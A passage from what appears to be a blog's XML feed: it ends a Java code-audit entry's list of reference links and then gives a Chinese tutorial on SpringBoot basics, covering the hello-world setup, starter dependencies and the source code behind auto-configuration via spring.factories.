title="参考文章："></a>参考文章：</h1><p><font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p><p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945 mybatis二级缓存反序列化的分析与复现</font></p><p><a href="https://www.freebuf.com/vuls/251862.html">https://www.freebuf.com/vuls/251862.html</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">MyBatis远程代码执行漏洞CVE-2020-26945</font></p><p><a href="https://www.freebuf.com/articles/web/252542.html">https://www.freebuf.com/articles/web/252542.html</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">Java 代码审计之华夏 ERP CMS v2.3</font></p><p><a href="https://www.freebuf.com/articles/web/347135.html"><font style="color:rgb(65, 131, 196);">https://www.freebuf.com/articles/web/347135.html</font></a></p><p>【Java代码审计】华夏-ERPv2.3</p><p><a href="https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html"><font style="color:rgb(65, 131, 196);">https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html</font></a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot</title>
    <link href="/2025/08/14/SpringBoot/"/>
    <url>/2025/08/14/SpringBoot/</url>
    
    <content type="html"><![CDATA[<h1 id="1、SpringBoot-简介"><a href="#1、SpringBoot-简介" class="headerlink" title="1、SpringBoot 简介"></a>1、SpringBoot 简介</h1><h2 id="1-1-什么是-SpringBoot"><a href="#1-1-什么是-SpringBoot" class="headerlink" title="1.1 什么是 SpringBoot"></a>1.1 什么是 SpringBoot</h2><p><font style="color:rgba(0, 0, 0, 0.9);">随着 Spring 不断的发展，涉及的领域越来越多，项目整合开发需要配合各种各样的文件，慢慢变得不那么易用简单，违背了最初的理念，甚至人称配置地狱。Spring Boot 正是在这样的一个背景下被抽象出来的开发框架，目的为了让大家更容易的使用 Spring 、更容易的集成各种常用的中间件、开源软件；</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以</font><strong><font style="color:rgba(0, 0, 0, 0.9);">约定大于配置的核心思想</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot的主要优点：</font></strong></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">为所有Spring开发者更快的入门</font></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">开箱即用</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，提供各种默认配置来简化项目配置</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">内嵌式容器简化Web项目</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">没有冗余代码生成和XML配置的要求</font></li></ul><h2 id="1-2-单体应用架构"><a href="#1-2-单体应用架构" class="headerlink" title="1.2 单体应用架构"></a>1.2 单体应用架构</h2><p>所谓单体应用架构（all in one）是指，我们将一个应用的中的所有应用服务都封装在一个应用中。</p><p>无论是ERP、CRM或是其他什么系统，你都把数据库访问，Web访问，等等各个功能放到一个war包内。</p><p>这样做的好处是，易于开发和测试；也十分方便部署；当需要扩展时，只需要将war复制多份，然后放到多个服务器上，再做个负载均衡就可以。</p><p>单体应用架构的缺点是，哪怕我要修改一个非常小的地方，我都需要停掉整个服务，重新打包、部署这个应用war包。特别是对于一个大型应用，我们不可能把所有内容都放在一个应用里面，我们如何维护、如何分工合作都是问题。</p><h2 id="1-3-微服务架构"><a href="#1-3-微服务架构" class="headerlink" title="1.3 微服务架构"></a><font style="color:rgba(0, 0, 0, 0.9);">1.3 微服务架构</font></h2><p><a href="https://www.ruanyifeng.com/blog/2022/04/microservice.html">微服务是什么？ - 阮一峰的网络日志</a></p><p><font style="color:rgba(0, 0, 0, 0.9);">all in one 的架构方式，我们把所有的功能单元放在一个应用里面。然后我们把整个应用部署到服务器上。如果负载能力不行，我们将整个应用进行水平复制，进行扩展，然后在负载均衡。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">所谓微服务架构，就是打破之前 all in one 的架构方式，把每个功能元素独立出来。把独立出来的功能元素的动态组合，需要的功能元素才去拿来组合，需要多一些时可以整合多个功能元素。所以微服务架构是对功能元素进行复制，而没有对整个应用进行复制。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">这样做的好处是：</font></p><ol><li><font style="color:rgba(0, 0, 0, 0.9);">节省了调用资源。</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">每个功能元素的服务都是一个可替换的、可独立升级的软件代码。</font></li></ol><h2 id="1-4-Hello，World-第一个-SpringBoot-程序"><a href="#1-4-Hello，World-第一个-SpringBoot-程序" class="headerlink" title="1.4 Hello，World - 第一个 SpringBoot 程序"></a><font style="color:rgba(0, 0, 0, 0.9);">1.4</font> Hello，World - 第一个 SpringBoot 程序</h2><p><font style="color:rgba(0, 0, 0, 0.9);">官网提供的创建网站：</font><a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303579.png"></p><p>下载解压之后：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303700.png"></p><p>正常情况下，idea 创建新项目即可</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303271.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303271.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303753.png"></p><p>创建一个接口测试：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303238.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303134.png"></p><p>maven 打包：</p><p><strong>注意：配置文件中的</strong><font style="color:#080808;background-color:#ffffff;"> </font><code>&lt;skip&gt;true&lt;/skip&gt; </code><font style="color:#080808;background-color:#ffffff;">，是让 </font><strong>spring-boot-maven-plugin 跳过执行</strong><font style="color:#080808;background-color:#ffffff;"> 的，所以 Maven 打包时不会生成可运行 JAR，自然就没有</font><code>Main-Class</code><font style="color:#080808;background-color:#ffffff;">，运行时就报 </font><strong>“没有主清单属性”</strong><font style="color:#080808;background-color:#ffffff;">。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303263.png"></p><p>修改之后可以正常运行：</p><p><code> java -jar helloworld-0.0.1-SNAPSHOT.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303329.png"></p><h1 id="2、原理"><a href="#2、原理" class="headerlink" title="2、原理"></a>2、原理</h1><h2 id="2-1-自动配置"><a href="#2-1-自动配置" class="headerlink" title="2.1 自动配置"></a>2.1 自动配置</h2><h3 id="2-1-1-pom-xml"><a href="#2-1-1-pom-xml" class="headerlink" title="2.1.1 pom.xml"></a>2.1.1 pom.xml</h3><h4 id="父依赖"><a href="#父依赖" class="headerlink" title="父依赖"></a>父依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 父依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 从远程仓库查找 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点进去，发现还有一个父依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里才是真正管理SpringBoot应用里面所有依赖版本的地方，SpringBoot的版本控制中心；</p><p>以后我们导入依赖默认是不需要写版本；但是如果导入的包没有在依赖中管理着就需要手动配置版本了；</p><h4 id="启动器-spring-boot-starter"><a href="#启动器-spring-boot-starter" class="headerlink" title="启动器 spring-boot-starter"></a>启动器 spring-boot-starter</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-comment">&lt;!--启动器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>springboot-boot-starter-xxx：就是spring-boot的场景启动器</p><p>spring-boot-starter-web：帮我们导入了web模块正常运行所依赖的组件；</p><p>SpringBoot将所有的功能场景都抽取出来，做成一个个的starter （启动器），只需要在项目中引入这些starter即可，所有相关的依赖都会导入进来 ， 我们要用什么功能就导入什么样的场景启动器即可 ；我们未来也可以自己自定义 starter；</p><h3 id="2-1-1-主启动类"><a href="#2-1-1-主启动类" class="headerlink" title="2.1.1 主启动类"></a>2.1.1 主启动类</h3><h4 id="默认的主启动类"><a href="#默认的主启动类" class="headerlink" title="默认的主启动类"></a>默认的主启动类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-comment">//@SpringBootApplication 来标注一个主程序类</span><br><span class="hljs-comment">//说明这是一个Spring Boot应用</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Springboot01HelloworldApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//将 springboot 应用启动</span><br>        SpringApplication.run(Springboot01HelloworldApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分析注解："><a href="#分析注解：" class="headerlink" title="分析注解："></a>分析注解：</h4><p>@SpringBootApplication</p><p><font style="color:rgba(0, 0, 0, 0.9);">作用：标注在某个类上说明这个类是SpringBoot的主配置类 ， SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251303899.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//前四个都属于元注解</span><br><span class="hljs-comment">//指定这个注解可以标注的 Java 元素类型，ElementType.TYPE 表示只能标注在类、接口、枚举或注解类型上</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-comment">//指定注解生命周期，RUNTIME 表示注解会 保留到运行时，可以通过 反射 获取</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-comment">//表示注解会包含在 Javadoc 文档中</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-comment">//如果一个类加了这个注解，它的子类也会自动继承该注解</span><br><span class="hljs-meta">@Inherited</span><br><br><span class="hljs-comment">//springboot 的配置，标记当前类是 Spring Boot 配置类，本质上是 @Configuration 的一个特化</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-comment">//启用自动配置</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><br><span class="hljs-comment">//启动组件扫描，会扫描当前类所在包及子包的 Spring Bean,excludeFilters：排除某些类不被扫描。</span><br><span class="hljs-meta">@ComponentScan(</span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">), @Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">)&#125;</span><br><span class="hljs-meta">)</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><br><span class="hljs-comment">//Spring 注解</span><br><span class="hljs-comment">//表示当前类是一个 Spring 配置类</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-comment">//Spring 在编译时会生成索引文件，用于快速扫描注解类，提高启动性能</span><br><span class="hljs-meta">@Indexed</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-comment">//自动配置包</span><br><span class="hljs-meta">@AutoConfigurationPackage</span><br><span class="hljs-comment">//给容器导入组件</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableAutoConfiguration &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.boot.enableautoconfiguration&quot;</span>;<br><br>    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    String[] excludeName() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-comment">//Spring底层注解@import ， 给容器中导入一个组件，Registrar.class 作用：将主启动类的所在包及包下面所有子包里面的所有组件扫描到Spring容器 ；</span><br><span class="hljs-meta">@Import(&#123;AutoConfigurationPackages.Registrar.class&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;<br>    String[] basePackages() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 @Import({AutoConfigurationImportSelector.class})</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br>-&gt;AutoConfigurationImportSelector<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoConfigurationImportSelector</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DeferredImportSelector</span>, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered &#123;<br>    ...<br>    <span class="hljs-comment">//获取所有候选的自动配置类;AnnotationMetadata metadata：标注了 @EnableAutoConfiguration 或 @SpringBootApplication 的类的注解信息;AnnotationAttributes attributes：注解的属性集合，比如 exclude、excludeName 等</span><br>    <span class="hljs-keyword">protected</span> List&lt;String&gt; <span class="hljs-title function_">getCandidateConfigurations</span><span class="hljs-params">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> &#123;<br>            <span class="hljs-comment">//通过 SpringFactoriesLoader 从 META-INF/spring.factories 文件中加载自动配置类名</span><br>        List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(<span class="hljs-built_in">this</span>.getSpringFactoriesLoaderFactoryClass(), <span class="hljs-built_in">this</span>.getBeanClassLoader());<br>            <span class="hljs-comment">//configurations 不为空，如果为空，抛出异常提示</span><br>        Assert.notEmpty(configurations, <span class="hljs-string">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);<br>            <span class="hljs-comment">//返回启动自动导入配置文件的注解类；EnableAutoConfiguration</span><br>        <span class="hljs-keyword">return</span> configurations;<br>        &#125;<br>-&gt;SpringFactoriesLoader.loadFactoryNames<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringFactoriesLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">loadFactoryNames</span><span class="hljs-params">(Class&lt;?&gt; factoryType, <span class="hljs-meta">@Nullable</span> ClassLoader classLoader)</span> &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoaderToUse</span> <span class="hljs-operator">=</span> classLoader;<br>        <span class="hljs-keyword">if</span> (classLoader == <span class="hljs-literal">null</span>) &#123;<br>            classLoaderToUse = SpringFactoriesLoader.class.getClassLoader();<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> factoryType.getName();<br>        <span class="hljs-comment">//调用了 loadSpringFactories 方法</span><br>        <span class="hljs-keyword">return</span> (List)loadSpringFactories(classLoaderToUse).getOrDefault(factoryTypeName, Collections.emptyList());<br>    &#125;<br>-&gt;loadSpringFactories<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; <span class="hljs-title function_">loadSpringFactories</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;<br>        <span class="hljs-comment">//cache 是静态缓存，避免每次都扫描文件。如果缓存存在，直接返回，提升性能</span><br>        Map&lt;String, List&lt;String&gt;&gt; result = (Map)cache.get(classLoader);<br>        <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//扫描 META-INF/spring.factories</span><br>                Enumeration&lt;URL&gt; urls = classLoader.getResources(<span class="hljs-string">&quot;META-INF/spring.factories&quot;</span>);<br><br>                <span class="hljs-comment">//将每个 spring.factories 文件包装成 UrlResource。使用 PropertiesLoaderUtils 加载为 Properties 对象，key=value 的形式</span><br>                <span class="hljs-keyword">while</span>(urls.hasMoreElements()) &#123;<br>                    <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> (URL)urls.nextElement();<br>                    <span class="hljs-type">UrlResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(url);<br>                    <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> PropertiesLoaderUtils.loadProperties(resource);<br><br>                    <span class="hljs-comment">//遍历文件中的每个条目,把实现类加入列表</span><br>                    <span class="hljs-keyword">for</span>(Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">factoryTypeName</span> <span class="hljs-operator">=</span> ((String)entry.getKey()).trim();<br>                        String[] factoryImplementationNames = StringUtils.commaDelimitedListToStringArray((String)entry.getValue());<br><br>                        <span class="hljs-keyword">for</span>(String factoryImplementationName : factoryImplementationNames) &#123;<br>                            ((List)result.computeIfAbsent(factoryTypeName, (key) -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>())).add(factoryImplementationName.trim());<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">//去重 distinct(),转为 不可修改列表（unmodifiableList）</span><br>                result.replaceAll((factoryType, implementations) -&gt; (List)implementations.stream().distinct().collect(Collectors.collectingAndThen(Collectors.toList(), Collections::unmodifiableList)));<br>                <span class="hljs-comment">//缓存结果并返回</span><br>                cache.put(classLoader, result);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>                <span class="hljs-comment">//读取文件出错时，抛出 IllegalArgumentException 异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unable to load factories from location [META-INF/spring.factories]&quot;</span>, ex);<br>            &#125;<br>        &#125;<br>    &#125;<br>-&gt;spring.factories （既然是对此文件做改动，那么全局搜索此文件）<br></code></pre></td></tr></table></figure><p>查看后发现都是自动配置文件，这就是自动配置的根源</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304861.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304988.png"></p><h5 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h5><p><font style="color:rgba(0, 0, 0, 0.9);">SpringBoot在启动的时候从类路径下的 META-INF&#x2F;spring.factories（spring-boot-autoconfigure-2.6.13.jar!\META-INF\spring.factories）中获取 EnableAutoConfiguration 指定的自动配置值</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304335.jpeg"></p><h4 id="SpringApplication"><a href="#SpringApplication" class="headerlink" title="SpringApplication"></a>SpringApplication</h4><p><strong><font style="color:rgba(0, 0, 0, 0.9);">这个类主要做了以下四件事情：</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">1、推断应用的类型是普通的项目还是Web项目</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">2、查找并加载所有可用初始化器 ， 设置到initializers属性中</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">3、找出所有的应用程序监听器，设置到listeners属性中</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">4、推断并设置main方法的定义类，找到运行的主类</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 